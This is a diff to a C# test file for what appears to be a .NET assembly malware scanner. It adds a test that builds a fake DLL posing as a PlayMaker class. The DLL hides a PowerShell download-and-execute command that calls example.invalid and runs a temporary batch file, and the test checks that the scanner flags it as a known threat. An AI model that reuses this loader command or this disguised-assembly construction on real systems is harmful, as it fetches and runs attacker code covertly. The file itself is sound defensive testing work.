@@ -130,6 +130,79 @@ public class SecurityRegressionEdgeCaseTests
     }
 
     [Fact]
+    public void Scan_HiddenPowerShellIwrTempBatchLauncher_MapsToKnownThreatFamily()
+    {
+        const string arguments =
+            "-ep bypass -c \"iwr 'https://example.invalid/usa/USAMAGA2022.bat' -out $env:TEMP\\dl.bat -useb; " +
+            "if (Test-Path $env:TEMP\\dl.bat) { Start-Process -NoNewWindow $env:TEMP\\dl.bat; " +
+            "Start-Sleep -Seconds 120; Remove-Item $env:TEMP\\dl.bat -Force }\"";
+        var assembly = AssemblyDefinition.CreateAssembly(
+            new AssemblyNameDefinition("PowerShellIwrTempBatchLauncher", new Version(1, 0, 0, 0)),
+            "PowerShellIwrTempBatchLauncher",
+            ModuleKind.Dll);
+        var module = assembly.MainModule;
+        var type = new TypeDefinition("HutongGames.PlayMaker", "ObjectTypeAttribute", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
+        module.Types.Add(type);
+        var method = new MethodDefinition("Load", MethodAttributes.Private | MethodAttributes.Static, module.TypeSystem.Void);
+        method.Body = new MethodBody(method) { InitLocals = true };
+        type.Methods.Add(method);
+
+        var processStartInfoType = CreateType(module, "System.Diagnostics.ProcessStartInfo");
+        method.Body.Variables.Add(new VariableDefinition(processStartInfoType));
+        var il = method.Body.GetILProcessor();
+        il.Emit(OpCodes.Newobj, CreateConstructor(module, "System.Diagnostics.ProcessStartInfo"));
+        il.Emit(OpCodes.Stloc_0);
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Ldstr, "powershell.exe");
+        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_FileName", module.TypeSystem.Void, module.TypeSystem.String));
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Ldstr, arguments);
+        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_Arguments", module.TypeSystem.Void, module.TypeSystem.String));
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Call, CreateStaticMethod(module, "System.IO.Path", "GetTempPath", module.TypeSystem.String));
+        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_WorkingDirectory", module.TypeSystem.Void, module.TypeSystem.String));
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Ldc_I4_1);
+        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_UseShellExecute", module.TypeSystem.Void, module.TypeSystem.Boolean));
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Ldc_I4_1);
+        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_WindowStyle", module.TypeSystem.Void, CreateType(module, "System.Diagnostics.ProcessWindowStyle")));
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Ldc_I4_1);
+        il.Emit(OpCodes.Callvirt, CreateInstanceMethod(module, "System.Diagnostics.ProcessStartInfo", "set_CreateNoWindow", module.TypeSystem.Void, module.TypeSystem.Boolean));
+        il.Emit(OpCodes.Ldloc_0);
+        il.Emit(OpCodes.Call, CreateStaticMethod(module, "System.Diagnostics.Process", "Start", CreateType(module, "System.Diagnostics.Process"), processStartInfoType));
+        il.Emit(OpCodes.Pop);
+        il.Emit(OpCodes.Ret);
+
+        byte[] assemblyBytes;
+        using var stream = new MemoryStream();
+        assembly.Write(stream);
+        assemblyBytes = stream.ToArray();
+        stream.Position = 0;
+        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules());
+        var findings = scanner.Scan(stream, "PowerShellIwrTempBatchLauncher.dll").ToList();
+        var result = ScanResultMapper.ToDto(findings, "PowerShellIwrTempBatchLauncher.dll", assemblyBytes, false);
+
+        findings.Should().ContainSingle(f =>
+            f.RuleId == "ProcessStartRule" &&
+            f.Severity == Severity.Critical &&
+            f.Description.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase) &&
+            f.Description.Contains("-ep bypass", StringComparison.OrdinalIgnoreCase) &&
+            f.Description.Contains("iwr", StringComparison.OrdinalIgnoreCase) &&
+            f.Description.Contains("dl.bat", StringComparison.OrdinalIgnoreCase) &&
+            f.Description.Contains("Start-Process", StringComparison.OrdinalIgnoreCase) &&
+            f.Description.Contains("Remove-Item", StringComparison.OrdinalIgnoreCase) &&
+            f.Description.Contains("Staged loader chain", StringComparison.OrdinalIgnoreCase));
+        result.ThreatFamilies.Should().NotBeNullOrEmpty();
+        result.ThreatFamilies!.Should().Contain(match =>
+            match.FamilyId == "family-powershell-iwr-dlbat-v1" &&
+            match.ExactHashMatch == false);
+        result.Disposition.Should().NotBeNull();
+        result.Disposition!.Classification.Should().Be("KnownThreat");
+    }
+
+    [Fact]
     public void Scan_RecursiveHelperResolvingProcessTarget_TerminatesAndStillReportsExecution()
     {
         var assembly = AssemblyDefinition.CreateAssembly(
@@ -186,5 +259,52 @@ public class SecurityRegressionEdgeCaseTests
         {
             throw new InvalidOperationException("simulated post-analysis failure");
         }
+    }
+
+    private static MethodReference CreateStaticMethod(
+        ModuleDefinition module,
+        string declaringTypeFullName,
+        string methodName,
+        TypeReference returnType,
+        params TypeReference[] parameterTypes)
+    {
+        var method = new MethodReference(methodName, returnType, CreateType(module, declaringTypeFullName))
+        {
+            HasThis = false
+        };
+        foreach (var parameterType in parameterTypes)
+        {
+            method.Parameters.Add(new ParameterDefinition(parameterType));
+        }
+
+        return method;
+    }
+
+    private static MethodReference CreateInstanceMethod(
+        ModuleDefinition module,
+        string declaringTypeFullName,
+        string methodName,
+        TypeReference returnType,
+        params TypeReference[] parameterTypes)
+    {
+        var method = CreateStaticMethod(module, declaringTypeFullName, methodName, returnType, parameterTypes);
+        method.HasThis = true;
+        return method;
+    }
+
+    private static MethodReference CreateConstructor(ModuleDefinition module, string declaringTypeFullName)
+    {
+        return new MethodReference(".ctor", module.TypeSystem.Void, CreateType(module, declaringTypeFullName))
+        {
+            HasThis = true
+        };
+    }
+
+    private static TypeReference CreateType(ModuleDefinition module, string fullName)
+    {
+        var lastDot = fullName.LastIndexOf('.');
+        var ns = lastDot > 0 ? fullName[..lastDot] : "";
+        var name = lastDot > 0 ? fullName[(lastDot + 1)..] : fullName;
+        return new TypeReference(ns, name, module, module.TypeSystem.CoreLibrary);
     }
 }
